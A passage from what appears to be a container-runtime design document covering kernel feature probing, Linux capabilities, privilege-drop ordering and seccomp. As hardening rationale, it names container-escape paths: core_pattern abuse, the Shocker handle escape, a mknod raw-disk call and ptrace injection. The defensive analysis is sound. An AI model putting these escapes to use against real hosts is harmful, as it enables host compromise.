| `pidfd_send_signal` | 5.1 | pid-recycling race on signal (§5.5) | wanted |
| seccomp user notify (`SECCOMP_RET_USER_NOTIF`) | 5.0 | no syscall emulation/supervision (§9.7) | optional |
| `cgroup.freeze` (v2 core) | 5.2 | no `pause`; racy kill fallback (§5.2) | strongly wanted |
| `CLONE_PIDFD` | 5.2 | must `pidfd_open` a pid we read | wanted |
| `fsopen`/`fsconfig`/`fsmount`/`move_mount`/`open_tree` | 5.2 | no fd-based mounting; harder TOCTOU-safe mounts (D1) | optional |
| `pidfd_open` | 5.3 | can't get a pidfd for an existing pid | optional |
| `clone3` | 5.3 | no `CLONE_INTO_CGROUP`; no extensible clone args | optional |
| `openat2` (`RESOLVE_*`) | 5.6 | must hand-roll symlink-safe path resolution (§12.5) | **strongly wanted** |
| time namespace | 5.6 | container shares host boot time / monotonic clock | don't care |
| `memory_recursiveprot` mount option | 5.7 | `memory.low` needs manual downward propagation (§1.1) | optional |
| `CLONE_INTO_CGROUP` | 5.7 | small unaccounted window at fork (§1.6) | nice-to-have |
| `CAP_BPF`, `CAP_PERFMON` split from `CAP_SYS_ADMIN` | 5.8 | BPF requires full `CAP_SYS_ADMIN` (§8.6) | wanted |
| `close_range(2)` | 5.9 | fd-closing loop over `/proc/self/fd` (§12.4) | wanted |
| `CAP_CHECKPOINT_RESTORE` | 5.9 | checkpoint needs `CAP_SYS_ADMIN` | don't care |
| seccomp `ADDFD` | 5.9 | user-notify can't inject fds | don't care |
| unprivileged overlayfs in userns + `userxattr` | 5.11 | rootless needs `fuse-overlayfs` (§17) | wanted (D3) |
| idmapped mounts (`mount_setattr` + `MOUNT_ATTR_IDMAP`) | 5.12 | rootless must `chown` whole layers (§10.5) | **strongly wanted** |
| `memory.events.local` | 5.13 `[F] MED` | can't separate own events from descendants' (§4.2) | optional |
| `cgroup.kill` | 5.14 | racy container kill (§5.2) | **strongly wanted** |
| `cpu.max.burst` | 5.14 | no burst credit for latency-sensitive services (§3.2) | optional |
| `cpuset.cpus.partition` | 5.17 `[F] LOW` | affinity only, not exclusive isolation | don't care |
| `memory.peak`, `memory.reclaim` | 5.19 `[F] MED` | no high-water mark; no proactive reclaim (§4.1, §4.5) | optional |
| `cgroup.pressure`, `pids.peak` | 6.1 `[F] MED` | can't disable PSI overhead; no pid high-water | optional |

### 7.2 What 4.18 / RHEL 8 costs — measured, not assumed

`[O] old-host HIGH` — raw-syscall probes on Rocky Linux 8.8, kernel
`4.18.0-425.3.1.el8.x86_64` (`ENOSYS` ⇒ absent; any other errno ⇒ present):

| syscall | nr | result | verdict |
|---|---|---|---|
| `clone3` | 435 | `ENOSYS` | **absent** |
| `openat2` | 437 | `EINVAL` | **present (backported)** |
| `faccessat2` | 439 | `EFAULT` | **present (backported)** |
| `pidfd_send_signal` | 424 | `EBADF` | **present (backported)** |
| `pidfd_open` | 434 | `ENOSYS` | **absent** |
| `epoll_pwait2` | 441 | `ENOSYS` | absent |
| `memfd_secret` | 447 | `ENOSYS` | absent |
| `fchmodat2` | 452 | `ENOSYS` | absent |

`[O] old-host HIGH` — `/proc/sys/kernel/cap_last_cap` reads **`40`**, and
`capsh --decode` names bit 40 as `cap_checkpoint_restore`. Upstream,
`CAP_CHECKPOINT_RESTORE` is **5.9**. So this 4.18 kernel has the full
capability space of a 5.9 kernel.

`[O] old-host HIGH` — **unprivileged overlayfs in a user namespace works.**
```
unshare -Urm mount -t overlay overlay \
  -o lowerdir=…/low,upperdir=…/up,workdir=…/work  …/mnt
```
returns `0`; reads from `lowerdir` succeed; a write creates a real file in
`upperdir` owned by the *real* uid (`sataromk:domain-users`), not `root`. The
resulting mountinfo line carries **no `userxattr` option**:
```
… /tmp/d5-ovl-…/mnt rw,relatime - overlay overlay rw,lowerdir=…,upperdir=…,workdir=…
```
Upstream, `FS_USERNS_MOUNT` for overlayfs plus the `userxattr` option is
**5.11**. `[F] MED` — Red Hat backported overlayfs-in-userns to RHEL 8 well
ahead of upstream (it is what makes rootless Podman/Buildah usable on RHEL 8,
which Red Hat shipped as a supported feature in RHEL 8.x). The absence of
`userxattr` fits: the RHEL backport predates the `user.overlay.*` xattr
namespace split, so it uses `trusted.overlay.*`-free semantics under a
different mechanism. `MED` on the mechanism, `HIGH` on the observed behaviour.
**Settled by** `rpm -q --changelog kernel | grep -i overlay` on a RHEL 8 box
with the kernel source RPM available, or by reading
`kernel-4.18.0-425.el8/fs/overlayfs/super.c` for `FS_USERNS_MOUNT`.

`[R] HIGH — the general lesson, and it is the most important thing in §7:
never gate a feature on `uname -r`.** RHEL 8 at 4.18 has `openat2`,
`faccessat2`, `pidfd_send_signal`, `CAP_CHECKPOINT_RESTORE` and
overlayfs-in-userns — all "5.x features" — while lacking `clone3` and
`pidfd_open`, and lacking PSI entirely. No version comparison predicts that
set. **Probe for the thing you need:**
- syscalls: issue the call with deliberately invalid arguments and treat
  `ENOSYS` as "absent". (Never with valid arguments — you do not want the probe
  to succeed at doing something.)
- cgroup features: `access(2)`/`stat(2)` the control file
  (`cgroup.kill`, `cgroup.freeze`, `memory.peak`).
- mount features: attempt the mount, classify the errno.
- capabilities: read `/proc/sys/kernel/cap_last_cap`.
- LSM: read `/sys/kernel/security/lsm` and `/sys/module/apparmor/parameters/enabled`.

`[R] HIGH` — And cache the probe results once per daemon start in a
`KernelFeatures` struct. This is the *only* place in the engine where kernel
version-dependence is allowed to live. Everything else asks that struct.

### 7.3 Recommended minimum kernel

`[R] HIGH — hard floor 5.10; recommended floor 5.15; feature-complete at 6.1.**

Reasoning:

- **5.10** is the oldest floor at which cgroup v2 unified is realistic in the
  field, `CAP_BPF`/`CAP_PERFMON` exist, `cgroup.freeze` exists, `openat2`
  exists, `CLONE_PIDFD` and `CLONE_INTO_CGROUP` exist, and `close_range`
  exists. It is also an LTS and it is what Debian 11 and Amazon Linux 2 (5.10)
  ship. Below 5.10 we start hand-rolling symlink-safe path resolution and lose
  the freezer, which costs real code.
- **5.15** (LTS, Ubuntu 22.04) adds `cgroup.kill`, `cpu.max.burst`, idmapped
  mounts (5.12), unprivileged overlayfs + `userxattr` (5.11), and
  `memory.events.local`. **`cgroup.kill` and idmapped mounts are the two that
  change our architecture rather than our feature list** — the first removes a
  race, the second removes an entire uid-shifting subsystem. This is the floor
  I would actually document.
- **6.1** (LTS) adds `memory.peak`/`memory.reclaim` (5.19) and
  `cgroup.pressure`/`pids.peak`, all of which are telemetry niceties.
- `[R]` The **development target should be 6.x** (the local VM), with 5.15
  as the tested-compatible floor and 5.10 as the "probably works, unsupported"
  floor. Explicitly **do not support 4.18/RHEL 8**: it has no cgroup v2
  unified by default, no PSI, no `clone3`, no `cgroup.kill`, no
  `cgroup.freeze`, no idmapped mounts — the amount of alternate-path code is
  larger than the v1 support question in §6.3, and it buys us one host that
  cannot be resource-limited anyway.

`[R] MED` — Tradeoff being accepted: enterprise RHEL 8 users are excluded.
For an R&D engine that is correct. If that ever changes, the cheapest path is
**not** to backport features but to require `--no-limits --cgroup-driver=none`
on such hosts, i.e. run containers with isolation but no resource control.
---

## 8. Capabilities

### 8.1 The five sets, and which one is the durable one

`[F] HIGH` — `capabilities(7)`, verbatim definitions:

| set | definition |
|---|---|
| **Permitted** (`CapPrm`) | "a limiting superset for the effective capabilities that the thread may assume", and for what may be added to inheritable |
| **Inheritable** (`CapInh`) | "a set of capabilities preserved across an `execve(2)`" |
| **Effective** (`CapEff`) | "the set of capabilities used by the kernel to perform permission checks for the thread" |
| **Bounding** (`CapBnd`) | "a mechanism that can be used to limit the capabilities that are gained during `execve(2)`" |
| **Ambient** (`CapAmb`) | "a set of capabilities that are preserved across an `execve(2)` of a program that is not privileged" (4.3+); invariant: nothing can be ambient unless it is both permitted **and** inheritable |

`[F] HIGH` — The `execve(2)` transformation, verbatim from `capabilities(7)`:

```
P'(ambient)     = (file is privileged) ? 0 : P(ambient)
P'(permitted)   = (P(inheritable) & F(inheritable)) |
                  (F(permitted) & P(bounding)) | P'(ambient)
P'(effective)   = F(effective) ? P'(permitted) : P'(ambient)
P'(inheritable) = P(inheritable)    [unchanged]
P'(bounding)    = P(bounding)       [unchanged]
```

Read the second line carefully. **`P(permitted)` does not appear on the right
hand side.** The permitted set you had before `execve` is *not* carried over.
The new permitted set is assembled entirely from the file's capability sets,
your inheritable set, and your ambient set — all clamped by bounding.

`[F] HIGH` — Consequences, in the order they matter for a container runtime:

1. **Dropping from `Permitted`/`Effective` is not durable.** It survives only
   until the next `execve` of a file with capabilities — at which point
   `F(permitted) & P(bounding)` can hand the capability straight back.
2. **Dropping from `Bounding` is durable and irreversible.** Per
   `capabilities(7)`: once dropped via `prctl(PR_CAPBSET_DROP)` it "cannot be
   restored to that set", and `CAP_SETPCAP` is required to drop. Bounding
   appears as a mask in the `P'(permitted)` formula, so a capability absent
   from bounding can never re-enter permitted from a file capability — ever, in
   this process or any descendant.
3. **The `root` special case is why containers are dangerous by default.** For
   a process with UID 0 (or a set-UID-root binary), the kernel treats
   `F(inheritable)` and `F(permitted)` as **all ones** and the file effective
   bit as set. So a uid-0 process `execve`ing *any* ordinary binary gets
   `P'(permitted) = P'(effective) = P(bounding)`. **Inside a container running
   as root, the bounding set is the entire security boundary** — nothing else
   in the formula constrains anything.

`[R] HIGH` — Therefore: **the capability policy for a container is exactly
"what is in the bounding set", and everything else is bookkeeping.** Our
implementation must drop the complement of the wanted set from bounding, and
set permitted/effective/inheritable/ambient consistently as a defence against
the non-root case. Getting bounding wrong is a vulnerability; getting the
others wrong is a bug.

### 8.2 Docker's default retained set — verified live

`[C] HIGH` — Docker's default, from `moby/daemon/pkg/oci/caps/defaults.go`
(`DefaultCapabilities()`), 14 capabilities:

```
CAP_CHOWN            CAP_DAC_OVERRIDE     CAP_FSETID       CAP_FOWNER
CAP_MKNOD            CAP_NET_RAW          CAP_SETGID       CAP_SETUID
CAP_SETFCAP          CAP_SETPCAP          CAP_NET_BIND_SERVICE
CAP_SYS_CHROOT       CAP_KILL             CAP_AUDIT_WRITE
```

Docker's default spec sets all three of `Bounding`, `Permitted`, `Effective`
to this list and leaves `Inheritable` and `Ambient` empty.

`[O] host-a HIGH` — `/proc/2588141/status` for PID 1 of
`webapp-nginx-1` (`nginx:stable`, no `--cap-add`/`--cap-drop`):
```
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
NoNewPrivs: 0
Seccomp: 2
Seccomp_filters: 1
```
`capsh --decode=0x00000000a80425fb` →
```
cap_chown, cap_dac_override, cap_fowner, cap_fsetid, cap_kill,
cap_setgid, cap_setuid, cap_setpcap, cap_net_bind_service, cap_net_raw,
cap_sys_chroot, cap_mknod, cap_audit_write, cap_setfcap
```
Exactly the 14, and `CapPrm == CapEff == CapBnd` with `CapInh = CapAmb = 0`,
confirming the source. `0xa80425fb` is worth memorising: seeing it in
`/proc/<pid>/status` on any host means "default Docker container".

`[O] host-a HIGH — the finding I did not expect: `NoNewPrivs: 0`.**
Docker does **not** set `PR_SET_NO_NEW_PRIVS` by default; it is opt-in via
`--security-opt no-new-privileges`. See §8.4 for why that matters and §9.5 for
how the seccomp filter got installed anyway.

`[C] MED` — For contrast, runc's own `libcontainer/specconv` default spec
(`example.go`, what `runc spec` emits) retains only **three**:
`CAP_AUDIT_WRITE`, `CAP_KILL`, `CAP_NET_BIND_SERVICE`. So "the OCI default" and
"the Docker default" are different things by a factor of ~5, and anyone
comparing our defaults to "the standard" needs to be told which.

### 8.3 Which of Docker's 14 are genuinely dangerous

`[R] HIGH` — Docker's set is a **1.0-era compatibility list**, not a considered
minimum. Four of the 14 are hard to defend:

- **`CAP_DAC_OVERRIDE`** — bypasses all file permission checks. Combined with a
  bind-mounted host directory, it reads and writes anything in it regardless of
  mode. It exists in the default set because package managers in images
  historically needed it. `[R]` Drop by default; it is the single highest-value
  removal.
- **`CAP_NET_RAW`** — raw and packet sockets. Enables ARP/NDP spoofing and DNS
  response spoofing against *other containers on the same bridge*, which is the
  concrete exploit (a container on a shared Docker bridge can hijack a
  neighbour's DNS). It is in the default set so `ping` works. `[R]` Drop by
  default; `net.ipv4.ping_group_range` gives unprivileged ping without it.
  `[O] host-a` — the host has `net.ipv4.ping_group_range = 1 0` (an empty
  range), and Docker's default is to set it to `0 2147483647` inside the
  container, which is exactly the `CAP_NET_RAW`-free ping mechanism.
- **`CAP_SETUID` / `CAP_SETGID`** — lets a process in the container become any
  uid in the container. That is fine *if* there is a user namespace; without
  one, "any uid in the container" is "any uid on the host", so a container
  process can become the uid that owns a bind-mounted host path. They are in
  the default set because `su`/`sudo`/`nginx` dropping to `www-data` need them.
  `[R]` Keep (breaking `nginx` is not acceptable) but document loudly that
  without userns they are host-uid-reaching.
- **`CAP_MKNOD`** — create device nodes. Harmless *only because* the device
  cgroup denies access to the resulting node (§15) and `/dev` is `nodev`-free
  but the rest of the container's mounts are `nosuid,nodev`. Remove either
  guard and `mknod("/tmp/disk", S_IFBLK, makedev(253,0))` gives raw disk
  access. `[R]` Drop by default; almost nothing needs it at runtime.
- **`CAP_SETPCAP`** — lets the process drop capabilities from its own bounding
  set and (4.3+) raise ambient capabilities from permitted∩inheritable. Not an
  escalation on its own (you cannot add to bounding), but it is what lets a
  container *raise ambient* and thereby pass capabilities through an `execve`
  of an unprivileged binary. `[R]` Drop by default.

`[R] MED — a defensible default set for our engine** (7 caps, not 14):
`CAP_CHOWN`, `CAP_FOWNER`, `CAP_FSETID`, `CAP_KILL`, `CAP_SETGID`,
`CAP_SETUID`, `CAP_NET_BIND_SERVICE`. Tradeoff: this breaks `apt-get install`
in a running container (needs `CAP_DAC_OVERRIDE` in some setups), breaks
`ping` unless we also set `ping_group_range`, breaks `chroot`-using binaries,
and breaks `mknod` in Dockerfiles executed at runtime. `[R]` Ship the
7-cap set as `--security-profile=strict` and Docker's 14 as the default, so we
are compatible out of the box and secure on request. Diverging on defaults is
the kind of thing that makes an engine "not Docker-compatible" in a way users
experience as broken.

### 8.4 `PR_SET_NO_NEW_PRIVS` — what it prevents

`[F] HIGH` — `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` sets a per-thread,
**irreversible**, `fork`- and `execve`-inherited bit. With it set, `execve`
will not grant privileges the caller did not already have. Specifically:
set-UID and set-GID bits are ignored, file capabilities are ignored, and the
LSM `execve` hooks that would raise privilege (an AppArmor profile transition
to a *more* privileged profile, an SELinux domain transition) are refused.
Source: `prctl(2)`, §`PR_SET_NO_NEW_PRIVS`.

`[F] HIGH` — Concretely, with `no_new_privs` set, running `/usr/bin/sudo`
(mode 4755, owner root) inside the container executes `sudo` as the *calling*
uid, so it fails rather than becoming root.

`[O] host-a HIGH` — `NoNewPrivs: 0` on a default Docker container. So a
default Docker container **can** use set-UID binaries to become uid 0 in the
container. Since there is no user namespace either (§10.4), uid 0 in the
container *is* uid 0 on the host — bounded only by the 14-cap bounding set.
That is a much thinner boundary than most users assume.

`[R] HIGH` — **Set `no_new_privs` by default.** Reasoning: the only things it
breaks are set-UID binaries inside the container (`sudo`, `su`, `ping` on old
images, `mount`) and file-capability binaries. Those are exactly the things a
container should not be doing at runtime. Docker's default is off purely for
1.x compatibility. Tradeoff: images that `USER app` and then `sudo` at runtime
break loudly — which is the right kind of breakage. Provide
`--security-opt allow-new-privileges` to turn it off. `[R]` This also
simplifies §9.5's ordering (see below), which is a second reason to do it.

### 8.5 Correct ordering of capability manipulation vs `setuid`/`execve`

`[F] HIGH` — The trap: `setuid(2)` from uid 0 to non-zero **clears the
permitted and effective sets** unless `SECBIT_KEEP_CAPS` /
`PR_SET_KEEPCAPS` is set (`capabilities(7)`, §"Effect of user ID changes on
capabilities"). So "drop caps then drop uid" and "drop uid then drop caps"
give different results, and one of them loses capabilities the container was
supposed to keep.

`[R] HIGH — the ordering our container init must use, and why each step is
where it is:**

```
 1. prctl(PR_SET_KEEPCAPS, 1)            # so step 4's setuid doesn't wipe caps
 2. setgroups(supplementary)             # needs CAP_SETGID; must precede setgid
 3. setresgid(gid,gid,gid)               # needs CAP_SETGID
 4. setresuid(uid,uid,uid)               # needs CAP_SETUID; LAST of the id changes
 5. prctl(PR_SET_KEEPCAPS, 0)
 6. for cap not in wanted: prctl(PR_CAPBSET_DROP, cap)   # needs CAP_SETPCAP
 7. capset(): permitted = effective = inheritable = wanted-subsets
 8. for cap in ambient_wanted: prctl(PR_CAP_AMBIENT_RAISE, cap)
 9. prctl(PR_SET_NO_NEW_PRIVS, 1)        # AFTER 6-8, BEFORE 10
10. seccomp filter install               # see §9.5 for the ordering constraint
11. execve(entrypoint)
```

Key points, each of which is a bug if reordered:

- **1 before 4.** Without `KEEPCAPS`, step 4 zeroes permitted/effective and
  steps 6–8 then operate on an empty set — the container silently gets no
  capabilities at all, which looks like "it works" until something needs
  `CAP_NET_BIND_SERVICE`.
- **2 before 3.** `setgroups` needs `CAP_SETGID`; after `setresgid` to a
  non-zero gid you may still have it (caps are uid-driven, not gid-driven), but
  the conventional and safe order is groups → gid → uid.
- **4 last among 2–4.** Dropping uid is what loses privilege; do it after
  everything that needs it.
- **6 before 7.** `capset` clamps to bounding, so dropping bounding first makes
  step 7's arithmetic trivially correct. Reversed, you can set a permitted bit
  and then have it silently removed.
- **9 after 8.** `no_new_privs` does not prevent `PR_CAP_AMBIENT_RAISE`
  (ambient is not a privilege *gain* at `execve`, it is a carry-over), but
  setting it before step 6 would be harmless while setting it before an
  intended LSM profile transition (§13) would break that transition. Keep it
  late.
- **9 before 11**, obviously, since its whole purpose is to constrain 11.

`[F] HIGH` — Also required and easy to forget: `SECBIT_NOROOT` /
`SECBIT_NO_SETUID_FIXUP` via `prctl(PR_SET_SECUREBITS)` are the *other* way to
express some of this. `[R]` Skip securebits; `no_new_privs` plus a correct
bounding set covers the same ground with one mechanism instead of two.

### 8.6 The dangerous capabilities, and why `CAP_SYS_ADMIN` is effectively root

`[F] HIGH` — `capabilities(7)` on `CAP_SYS_ADMIN` calls it "overloaded" and
tells kernel developers: **"Don't choose CAP_SYS_ADMIN if you can possibly
avoid it!"** It gates, among ~40 unrelated operations:
`mount(2)`/`umount2(2)`, `pivot_root(2)`, `setns(2)`, `unshare(2)` of most
namespace types, `keyctl(2)` privileged ops, `ioctl(2)` `BLKxxx`,
`bpf(2)` (pre-5.8), `perf_event_open(2)` (pre-5.8),
`open_by_handle_at(2)` (with `CAP_DAC_READ_SEARCH`), `pciconfig_*`,
`sethostname`/`setdomainname`, `nfsservctl`, `swapon`, `lookup_dcookie`, and
writing to `/proc/sys/kernel/*` entries.

`[R] HIGH — why it *is* root, concretely, in three independent ways:**
1. **`mount`.** With `CAP_SYS_ADMIN` a container can `mount -t proc proc /proc`
   fresh (defeating every masked path from §11), remount `/` read-write,
   bind-mount over `/etc/ld.so.preload`, or — the classic — mount the host's
   `/` if any block device node is reachable.
2. **`unshare` + `mount`.** With `CAP_SYS_ADMIN` it can create a new mount
   namespace and a new user namespace and thereby escape whatever propagation
   and read-only constraints the runtime set up. CVE-2022-0492 (§12.2) is
   exactly this, and it is why Docker's seccomp profile gates `unshare` and
   `mount` on `CAP_SYS_ADMIN` (§9.6).
3. **`/proc/sys` writes.** With a writable `/proc/sys` (which requires
   defeating §11's read-only bind, which requires `mount`, which requires
   `CAP_SYS_ADMIN`) it can set `kernel.core_pattern` to a pipe command that
   the *host* kernel executes as host root on the next core dump. This is the
   single most reliable container escape when `--privileged` is used.

`[R] HIGH` — The others, ranked by how much they buy an attacker:

| capability | what it actually gives | verdict |
|---|---|---|
| `CAP_SYS_MODULE` | `init_module(2)` — load an arbitrary kernel module. **Game over immediately**, no cleverness required. | never grant |
| `CAP_SYS_ADMIN` | see above | never grant; `--privileged` only |
| `CAP_SYS_RAWIO` | `iopl`/`ioperm`, `/dev/mem`-class access, raw block ioctls. Direct physical memory ⇒ host root. | never grant |
| `CAP_SYS_PTRACE` | `ptrace(2)` any process **in the same PID namespace**. Inside a private PID ns that is only container processes — so it is far less dangerous than its reputation *provided* the PID namespace is private. With `--pid=host` it is host root: ptrace a host root process and inject code. | grant only with private pidns; never with `--pid=host` |
| `CAP_DAC_READ_SEARCH` | bypass read/search checks **and** `open_by_handle_at(2)`. The latter is the killer: it opens a file by NFS-style handle, which is not path-based, so it **escapes the container's rootfs entirely** given a guessable inode number. This is the Shocker exploit. | never grant |
| `CAP_BPF` (5.8+) | privileged `bpf(2)`. With `CAP_PERFMON` it can read arbitrary kernel memory via BPF helpers; alone it can attach cgroup/socket programs. | never grant |
| `CAP_PERFMON` (5.8+) | `perf_event_open(2)` — kernel-wide profiling, side-channel and kernel-address leakage. | never grant |
| `CAP_NET_ADMIN` | full network stack control in the container's netns — routes, iptables, interfaces. Dangerous only if the netns is shared with the host (`--net=host`). This is the capability D4's mechanisms are gated on. | grant only for private netns |
| `CAP_NET_RAW` | raw/packet sockets ⇒ neighbour spoofing on a shared bridge | drop by default (§8.3) |
| `CAP_SETUID`/`CAP_SETGID` | become any uid **in the container**, which without userns means on the host | keep, but see §8.3 |
| `CAP_SETFCAP` | write file capabilities. On a writable layer, set `cap_sys_admin+ep` on a binary — but `no_new_privs` neutralises it, and the bounding set clamps it anyway. | low risk; drop anyway |
| `CAP_SYSLOG` | read the kernel ring buffer ⇒ KASLR offsets, kernel pointers | never grant |
| `CAP_SYS_BOOT` | `reboot(2)` — reboots the **host** (there is no reboot namespace) | never grant |
| `CAP_SYS_TIME` | set the system clock — there is no time namespace for the *wall* clock, so this affects the host | never grant |
| `CAP_MKNOD` | create device nodes (§8.3) | drop by default |
| `CAP_AUDIT_WRITE` | write to the kernel audit log. In Docker's default set only because `login`/`sshd` in images want it. Harmless-ish, but it lets a container forge audit records. | drop by default |

`[O] old-host HIGH — the in-userns capability set, for contrast.**
`unshare -Ur` then reading `/proc/self/status` gives
`CapEff = CapPrm = CapBnd = 0x000001ffffffffff` — **all 41 capabilities**
(`cap_last_cap = 40`), including `cap_sys_admin`, `cap_sys_module`,
`cap_mac_admin`, `cap_bpf`. This is the point of user namespaces and the point
that confuses people: **you get every capability, but only over objects owned
by that namespace.** `cap_sys_module` in a non-init userns cannot load a
module, because `init_module` checks `capable(CAP_SYS_MODULE)` against the
*initial* namespace. `[R]` Our error messages must never say "you have
CAP_SYS_ADMIN" without saying which namespace.

### 8.7 What runc actually does, in order — the authoritative sequence

`[C] HIGH` — `runc/libcontainer/standard_init_linux.go`, `Init()`, in order:

```
 1. keyring setup (unless NoNewKeyring)
 2. network / route setup
 3. console setup
 4. prepareRootfs + finalizeRootfs          (pivot_root, remounts)
 5. sethostname / setdomainname
 6. apparmor.ApplyProfile(...)              <-- LSM profile BEFORE cap drop
 7. sysctls
 8. readonlyPaths + maskPaths                (§11)
 9. prctl(PR_SET_NO_NEW_PRIVS, 1)           <-- if config.NoNewPrivileges
10. scheduler / ioprio
11. personality
12. memory policy
13. sync with parent ("ready")
14. selinux exec label
15a. if !NoNewPrivileges: seccomp install    <-- BEFORE finalizeNamespace
16.  finalizeNamespace()                     <-- drops caps, setuid/setgid
15b. if NoNewPrivileges: seccomp install     <-- AFTER finalizeNamespace
17. restore parent-death signal
18. StartContainer hooks
19. exec.LookPath(entrypoint)                <-- resolved path, NOT /proc/self/exe
20. utils.UnsafeCloseFrom(...)               <-- close all fds above a threshold
21. unix.Exec(name, args, env)
```

The two comments in the source are the whole answer to "where does the filter
go":
> *"Without NoNewPrivileges seccomp is a privileged operation, so we need to
> do this before dropping capabilities"*

> *"Set seccomp as close to execve as possible, so as few syscalls take place
> afterward"*

`[F] HIGH` — This resolves the apparent contradiction in §8.5: `no_new_privs`
can be set **before** capability dropping without harm, because the bit only
affects `execve`, not `capset(2)` or `prctl(PR_CAPBSET_DROP)`. runc sets it
early (step 9) and my §8.5 listing put it late; both are correct. What is
**not** correct is setting seccomp before `no_new_privs` and before caps are
dropped *while claiming* the filter is minimal — a filter installed while you
still hold `CAP_SYS_ADMIN` is installed with privilege, which is exactly why
step 15a exists.

`[R] HIGH` — Because we set `no_new_privs` by default (§8.4), **we only need
path 15b**: install the filter after dropping capabilities, immediately before
`execve`. That deletes the entire "install with privilege" branch and its
ordering hazard. This is a concrete simplification our default buys us, and
it is a good argument for that default independent of the security one.

`[R] HIGH` — Steps 19 and 20 are load-bearing and are §12's requirements
restated: resolve the entrypoint with a path (not `/proc/self/exe`, see
§12.1) and **close every inherited fd before `execve`** (see §12.4).
---

## 9. seccomp

### 9.1 Mechanics: what the filter actually sees

`[F] HIGH` — A seccomp filter is a cBPF (classic BPF) program, evaluated on
every syscall entry, whose input buffer is exactly this struct
(`seccomp(2)`, verbatim):

```c
struct seccomp_data {
    int   nr;                   /* System call number */
    __u32 arch;                 /* AUDIT_ARCH_* value (see <linux/audit.h>) */
    __u64 instruction_pointer;  /* CPU instruction pointer */
    __u64 args[6];              /* Up to 6 system call arguments */
};
```

The program may only load from this buffer (`BPF_LD | BPF_W | BPF_ABS` at
offsets within it), do arithmetic and comparisons on registers, jump, and
return a 32-bit action word. There are no helper calls, no loops (the verifier
rejects backward jumps), and **no memory outside the buffer**.

`[F] HIGH` — **Therefore a filter cannot dereference pointer arguments.** If
`open(2)`'s first argument is a `char *`, the filter sees a 64-bit integer, not
a path. This is not an oversight; it is the only safe design, because between
the filter's read of user memory and the kernel's own read of it, another
thread in the same address space could change it — a classic TOCTOU. The
kernel would then enforce policy on one value and act on another.
`[F] MED` — the `seccomp(2)` man page I fetched does not state this reason in
so many words; the reasoning is standard and is stated in
`Documentation/userspace-api/seccomp_filter.rst` ("the BPF program cannot
dereference pointers"). `MED` on the exact wording, `HIGH` on the fact.

`[R] HIGH` — Design consequences that follow directly:
- **We cannot write a "deny `open()` of `/etc/shadow`" rule.** Path-based
  policy belongs to an LSM (§13), not to seccomp. Anyone who proposes a
  path-based seccomp rule has misunderstood the mechanism.
- **We can filter flags and integer arguments**, which is why the useful rules
  are things like "`clone` with no `CLONE_NEW*` flag", "`personality` equal to
  0", "`mount` never".
- **Multiplexed syscalls are opaque in the same way.** `ioctl(fd, request,
  argp)` — `request` is an integer so it *is* filterable, but the set of
  meaningful requests is enormous and driver-specific, so nobody filters it
  usefully. `socketcall(2)` (i386 only) packs the real call number *and* its
  arguments behind a pointer, so on i386 you cannot distinguish `socket` from
  `bind` from `connect` at all. `[R]` This is one more reason to refuse to
  emit an i386 filter (§9.4).

### 9.2 Installing it: `prctl` vs `seccomp(2)`

`[F] HIGH` — Two entry points:
- `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)` — the original (2.6.12
  for strict mode, 3.5 for filter mode). No flags, no return value beyond
  success/failure, single-thread only.
- `seccomp(SECCOMP_SET_MODE_FILTER, flags, &prog)` — since **3.17**. Takes
  flags, and is the only way to get `TSYNC`, `LOG`, `SPEC_ALLOW`, or
  `NEW_LISTENER`.

`[F] HIGH` — Either way, the caller must satisfy one of two conditions
(`seccomp(2)`): "either the calling thread must have the `CAP_SYS_ADMIN`
capability in its user namespace, or the thread must already have the
`no_new_privs` bit set." Otherwise **`EACCES`**.

The reason for that condition is the whole security model of seccomp: a filter
that returns `ERRNO` for a syscall a set-UID binary depends on could be used to
make that binary misbehave in the attacker's favour (e.g. make `setuid()`
"succeed" while returning an error the program ignores). `no_new_privs`
guarantees no set-UID transition will happen, so the filter cannot be weaponised
that way.

`[O] old-host` — I attempted to verify the `EACCES` empirically with a
`ctypes` probe of `syscall(317, SECCOMP_SET_MODE_FILTER, 0, &prog)` with and
without `PR_SET_NO_NEW_PRIVS`; the probe produced no output (the forked child's
`print` did not reach the captured stream) so **this is unverified**. `LOW`
on the empirical side; the man page statement is `HIGH`. **Settled by** a
5-line C program on the local VM.

`[O] host-a HIGH — the live evidence that this condition is real.**
`webapp-nginx-1` PID 1 has `Seccomp: 2` (`SECCOMP_MODE_FILTER`),
`Seccomp_filters: 1`, and `NoNewPrivs: 0`. Since `no_new_privs` is *not* set,
the filter must have been installed under `CAP_SYS_ADMIN` — which runc's
container init still held at that point, because it installs the filter
**before** `finalizeNamespace()` drops capabilities (§8.7, path 15a). The 14
final capabilities do not include `CAP_SYS_ADMIN`, so the filter could not have
been installed after the drop. The `/proc/<pid>/status` fields and the runc
source agree exactly.

`[F] HIGH` — `SECCOMP_FILTER_FLAG_TSYNC` synchronises the filter across **all
threads of the calling process**, and fails (`ESRCH`, or `EBUSY` for older
semantics) if any thread cannot be synchronised. Without it, a filter installed
on one thread applies to that thread only — subsequently created threads
inherit it, but *existing sibling threads do not get it*.

`[R] HIGH` — Our container init is **single-threaded at the point of
install**, by construction: it is the child of a `clone` that has not yet
`execve`'d and has spawned no threads. So we do **not** need `TSYNC`.
`[R]` This is a real constraint on the runtime's Rust design and it belongs in
D2's decision record: **the process that installs seccomp, drops capabilities,
and calls `execve` must not be multithreaded.** A Rust async runtime (tokio)
spawns worker threads; if the container-init code runs inside such a runtime
after `fork`, we are in the classic "fork in a multithreaded process" hazard
*and* we would need `TSYNC`. The clean answer is that container init is a
separate, single-threaded, `no_std`-ish code path — which is exactly why runc
re-execs a tiny `runc init`.

`[F] HIGH` — Filters are inherited across `fork(2)`/`clone(2)` and **preserved
across `execve(2)`**, and cannot be removed or relaxed — only further filters
can be added, and all installed filters are evaluated with the
highest-precedence (most restrictive) result winning.

### 9.3 The actions, and choosing between them

`[F] HIGH` — `seccomp(2)`, in **decreasing** precedence (the numeric value of
the action word determines precedence, so with several filters installed the
most restrictive result wins):

| action | semantics |
|---|---|
| `SECCOMP_RET_KILL_PROCESS` | "immediate termination of the process, with a core dump" (4.14+) |
| `SECCOMP_RET_KILL_THREAD` | "immediate termination of the thread" (the original `SECCOMP_RET_KILL`) |
